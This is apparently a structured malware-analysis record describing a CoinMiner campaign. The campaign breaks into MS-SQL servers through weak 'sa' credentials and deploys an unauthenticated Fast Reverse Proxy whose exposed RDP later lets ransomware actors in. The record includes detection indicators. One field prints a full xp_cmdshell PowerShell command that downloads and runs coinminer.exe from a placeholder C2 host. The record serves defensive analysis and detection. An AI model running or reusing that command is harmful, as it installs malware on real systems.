package_info.package_manager: custom/standalone (not from a public package manager)
package_info.why_malicious: The Fast Reverse Proxy server software was deliberately modified and deployed by a CoinMiner threat actor to provide persistent, unauthorized remote access to compromised systems. The modifications removed authentication and exposed RDP ports, enabling both the original attacker and opportunistic ransomware actors to access and control internal hosts, facilitating lateral movement and further compromise. Its use as malicious infrastructure is evidenced by its deployment in a botnet and subsequent exploitation by multiple threat actors.

execution_context.file_location: Modified Fast Reverse Proxy server binary/configuration

malicious_snippets.code_snippet: Custom Fast Reverse Proxy configuration with exposed RDP port and no login restrictions, enabling remote access to internal botnet systems.
malicious_snippets.code_language: configuration (proxy server, likely Go or shell for deployment)
malicious_snippets.code_behavior: At runtime, the proxy server listens on an externally accessible RDP port without authentication, forwards all incoming RDP connections to internal botnet hosts, and enables unrestricted remote access and lateral movement.

malice_analysis.why_suspicious: Exposing RDP ports to the public internet without any authentication or access controls is highly abnormal and creates a critical security risk, as it allows any remote actor to access internal systems without restriction.
malice_analysis.violated_expectations: A legitimate proxy server should enforce strict access controls, require authentication for sensitive services like RDP, and never expose such services to the public internet without safeguards.
malice_analysis.similar_legitimate_use: In controlled penetration testing or temporary troubleshooting scenarios, administrators may expose services, but always with strong access controls and never in production environments or without authentication.
key_indicators: Externally exposed RDP port in proxy configuration
Absence of authentication or login restrictions in proxy settings
Proxy forwarding RDP traffic to internal botnet hosts
Configuration or binary modifications disabling access controls

malicious_snippets.code_snippet: EXEC xp_cmdshell 'powershell -Command "Invoke-WebRequest -Uri http://C2_SERVER/coinminer.exe -OutFile C:\Windows\Temp\coinminer.exe; Start-Process C:\Windows\Temp\coinminer.exe"';
malicious_snippets.code_behavior: At runtime, after the attacker gains administrative access to MS-SQL, the code abuses xp_cmdshell to execute a PowerShell command that downloads coinminer.exe from a remote C2 server to C:\Windows\Temp\, then launches the malware, resulting in persistent infection and C2 communication.

malice_analysis.why_suspicious: Abusing xp_cmdshell to download and execute remote binaries is a well-known malware delivery technique and is never part of normal database administration. This behavior directly introduces malware onto the system.
malice_analysis.violated_expectations: MS-SQL servers should not be used to execute arbitrary remote code or download and run untrusted binaries, especially via xp_cmdshell, which is disabled by default for security reasons.
malice_analysis.similar_legitimate_use: System administrators may use xp_cmdshell for legitimate maintenance tasks, but never to fetch and execute untrusted code from external sources.
key_indicators: Remote download of coinminer.exe to C:\Windows\Temp\
Outbound HTTP requests to attacker-controlled C2 domains

attack_chain.action: Attacker scans for MS-SQL servers with weak 'sa' credentials and gains administrative access.
Attacker uses xp_cmdshell to download and execute CoinMiner malware from a C2 server.
attack_chain.leads_to: Establishment of botnet and C2 infrastructure

attack_chain.action: CoinMiner group deploys a modified Fast Reverse Proxy server to control infected bots, exposing RDP port without authentication.
attack_chain.leads_to: Proxy server becomes exposed to the internet

attack_chain.action: Ransomware actor scans for exposed RDP ports, discovers the proxy server, and gains administrative access due to lack of restrictions.
Ransomware actor moves laterally through the botnet and deploys ransomware across the network.

behavioral_signatures: Proxy servers exposing RDP or other sensitive ports to the public internet without authentication or access controls
MS-SQL servers invoking xp_cmdshell to execute PowerShell commands that download and run remote binaries
Unusual lateral movement or RDP access originating from proxy infrastructure with no authentication
Configuration or binary changes in proxy software that disable authentication or access controls
file_indicators: Modified Fast Reverse Proxy binaries or configuration files with authentication disabled
Proxy server configuration files specifying open RDP ports without access restrictions
network_indicators: Outbound HTTP requests from MS-SQL servers to known CoinMiner C2 domains or IP addresses
Inbound RDP connections from untrusted or external IP addresses to proxy servers
Proxy server forwarding RDP traffic to internal botnet hosts
Unusual RDP session patterns correlating with proxy server activity
detection_knowledge.how_to_detect: Monitor for proxy servers that expose RDP or other sensitive services to the public internet without authentication, especially those forwarding traffic to internal hosts. Alert on MS-SQL servers invoking xp_cmdshell to execute PowerShell commands that download and run remote binaries. Detect the presence of coinminer.exe in C:\Windows\Temp\ and look for new or modified proxy server binaries or configurations that disable authentication. Correlate unusual RDP access patterns and lateral movement with proxy server activity to identify potential ransomware deployment.
